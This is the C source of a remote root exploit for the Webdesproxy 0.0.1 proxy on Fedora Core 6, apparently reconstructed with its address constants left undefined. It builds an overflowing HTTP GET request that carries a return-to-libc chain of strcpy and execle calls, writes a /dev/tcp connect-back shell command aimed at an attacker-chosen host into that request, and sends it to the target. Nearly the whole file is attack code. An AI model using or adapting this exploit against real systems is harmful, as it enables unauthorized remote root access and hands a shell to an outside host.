
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int ex_buf ;


 int AF_INET ;
 long BIN_SH_END ;
 long BIN_SH_LOC ;
 long CONN_BACK_LOC ;
 long C_OPTION_END ;
 long C_OPTION_LOC ;
 long EXECLE_00_0xff ;
 long EXECLE_08_0xff ;
 long EXECLE_16_0xff ;
 long EXIT_GOT ;
 long EXIT_PLT ;
 long MOVE_ESP ;
 long NULL_STR ;
 long RET_CODE ;
 int RET_CODE_COUNT ;
 int SOCK_STREAM ;
 long STRCPY_PLT ;
 int atoi (char*) ;
 int bzero (int *,int) ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int ) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 int send (int,unsigned char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int sprintf (unsigned char*,char*,...) ;
 int strlen (unsigned char*) ;

int main(int argc,char *argv[]){
 int i=0,l=0,sock;
 unsigned char ex_buf[4096];

 struct hostent *se;
 struct sockaddr_in saddr;

 memset((char *)ex_buf,0,sizeof(ex_buf));
 printf("\n Fedora Core 6 (exec-shield) based\n"
  " Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit\n"
  " by Xpl017Elz\n\n");

 if(argc<6){
  printf(" Usage: %s [host] [port] [conn-back host] [input port] [output port]\n",argv[0]);
  printf(" Example: %s webdesproxy.host.co.kr 8080 hax0r.kr 8282 8383\n\n",argv[0]);
  return -1;
 }

 sprintf(ex_buf,"GET http://");
 l=strlen(ex_buf);
 for(i=0;i<220;i++){
  ex_buf[l++]=0x78;
 }
 i=0;

 printf(" [+] make execle() address.\n");
 {

  *(long *)&ex_buf[l]=STRCPY_PLT;
  l+=4;
  *(long *)&ex_buf[l]=MOVE_ESP;
  l+=4;
  *(long *)&ex_buf[l]=EXIT_GOT+i++;
  l+=4;
  *(long *)&ex_buf[l]=EXECLE_00_0xff;
  l+=4;

  *(long *)&ex_buf[l]=STRCPY_PLT;
  l+=4;
  *(long *)&ex_buf[l]=MOVE_ESP;
  l+=4;
  *(long *)&ex_buf[l]=EXIT_GOT+i++;
  l+=4;
  *(long *)&ex_buf[l]=EXECLE_08_0xff;
  l+=4;

  *(long *)&ex_buf[l]=STRCPY_PLT;
  l+=4;
  *(long *)&ex_buf[l]=MOVE_ESP;
  l+=4;
  *(long *)&ex_buf[l]=EXIT_GOT+i++;
  l+=4;
  *(long *)&ex_buf[l]=EXECLE_16_0xff;
  l+=4;
 }

 *(long *)&ex_buf[l]=STRCPY_PLT;
 l+=4;
 *(long *)&ex_buf[l]=MOVE_ESP;
 l+=4;
 *(long *)&ex_buf[l]=BIN_SH_END;
 l+=4;
 *(long *)&ex_buf[l]=NULL_STR;
 l+=4;


 *(long *)&ex_buf[l]=STRCPY_PLT;
 l+=4;
 *(long *)&ex_buf[l]=MOVE_ESP;
 l+=4;
 *(long *)&ex_buf[l]=C_OPTION_END;
 l+=4;
 *(long *)&ex_buf[l]=NULL_STR;
 l+=4;

 printf(" [+] execle() argument align padddding...\n");
 for(i=0;i<RET_CODE_COUNT;i++){
  *(long *)&ex_buf[l]=RET_CODE;
  l+=4;
 }

 printf(" [+] make execute command.\n");
 {





  *(long *)&ex_buf[l]=EXIT_PLT;
  l+=4;
  *(long *)&ex_buf[l]=0x82828282;
  l+=4;
  *(long *)&ex_buf[l]=BIN_SH_LOC;
  l+=4;
  *(long *)&ex_buf[l]=BIN_SH_LOC;
  l+=4;
  *(long *)&ex_buf[l]=C_OPTION_LOC;
  l+=4;
  *(long *)&ex_buf[l]=CONN_BACK_LOC;
  l+=4;
 }

 printf(" [+] make connect-back shell command.\n");
 {

  sprintf(ex_buf+l,"/bin/shx-cxsh</dev/tcp/%s/%d>/dev/tcp/%s/%d;\n",argv[3],atoi(argv[4]),argv[3],atoi(argv[5]));
  l=strlen(ex_buf);
 }

 printf(" [+] connect host: %s:%d.\n",argv[1],atoi(argv[2]));
 se=gethostbyname(argv[1]);
 if(se==((void*)0)){
  printf(" [-] gethostbyname() error.\n\n");
  return -1;
 }
 sock=socket(AF_INET,SOCK_STREAM,0);
 if(sock==-1){
  printf(" [-] socket() error.\n\n");
  return -1;
 }
 saddr.sin_family=AF_INET;
 saddr.sin_port=htons(atoi(argv[2]));
 saddr.sin_addr=*((struct in_addr *)se->h_addr);
 bzero(&(saddr.sin_zero),8);

 i=connect(sock,(struct sockaddr *)&saddr,sizeof(struct sockaddr));
 if(i==-1){
  printf(" [-] connect() error.\n\n");
  return -1;
 }

 printf(" [+] exploit size: %d.\n",l);
 printf(" [+] send exploit.\n");
 send(sock,ex_buf,l,0);
 close(sock);

 printf(" [*] checking, your connect-back host. :-}\n\n");
 exit(0);
}
